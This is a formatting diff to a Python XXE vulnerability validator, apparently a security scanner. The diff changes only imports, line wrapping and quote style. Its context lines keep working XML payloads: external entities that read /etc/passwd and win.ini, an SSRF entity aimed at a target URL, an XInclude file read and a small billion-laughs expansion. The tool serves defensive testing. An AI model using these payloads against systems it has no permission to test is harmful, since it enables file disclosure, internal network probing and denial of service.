@@ -14,7 +14,6 @@ CWE Coverage: CWE-611, CWE-776, CWE-827, CWE-918
 import hashlib
 import json
 import re
-import time
 from dataclasses import dataclass, field
 from typing import Any, Optional
 from urllib.parse import urljoin
@@ -131,7 +130,9 @@ class XXEValidator:
             return content
         return content[:max_len] + "..."
 
-    def _check_file_disclosure(self, response: str, os_type: str = "linux") -> Optional[tuple[str, str]]:
+    def _check_file_disclosure(
+        self, response: str, os_type: str = "linux"
+    ) -> Optional[tuple[str, str]]:
         """Check if response contains file disclosure indicators."""
         indicators = self.FILE_INDICATORS.get(os_type, [])
         for pattern, file_name in indicators:
@@ -181,11 +182,11 @@ class XXEValidator:
         else:
             file_uri = "file:///c:/windows/win.ini"
 
-        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{file_uri}">
 ]>
-<root><data>&xxe;</data></root>'''
+<root><data>&xxe;</data></root>"""
 
         try:
             status_code, response_body, _, response_time = self._make_request(
@@ -271,11 +272,11 @@ class XXEValidator:
         """
         url = urljoin(self.base_url, endpoint)
 
-        payload = f'''<?xml version="1.0"?>
+        payload = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{target_url}">
 ]>
-<foo>&xxe;</foo>'''
+<foo>&xxe;</foo>"""
 
         try:
             status_code, response_body, _, response_time = self._make_request(
@@ -360,9 +361,9 @@ class XXEValidator:
         """
         url = urljoin(self.base_url, endpoint)
 
-        payload = '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        payload = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>'''
+</foo>"""
 
         try:
             status_code, response_body, _, response_time = self._make_request(
@@ -431,13 +432,13 @@ class XXEValidator:
         url = urljoin(self.base_url, endpoint)
 
         # MINIMAL payload - only 3 levels
-        payload = '''<?xml version="1.0"?>
+        payload = """<?xml version="1.0"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
 ]>
-<lolz>&lol3;</lolz>'''
+<lolz>&lol3;</lolz>"""
 
         # Get baseline if not provided
         if baseline_time is None:
